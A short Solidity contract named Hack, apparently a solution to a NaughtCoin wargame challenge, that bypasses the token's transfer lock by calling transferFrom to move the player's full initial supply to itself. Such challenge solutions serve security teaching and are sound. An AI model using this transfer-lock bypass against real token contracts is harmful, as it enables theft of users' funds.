// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaughtCoin.sol";

contract Hack {
    function attack(address target) external {
        address player = NaughtCoin(target).player();
        uint256 amount = NaughtCoin(target).INITIAL_SUPPLY();
        NaughtCoin(target).transferFrom(player, address(this), amount);
    }
}
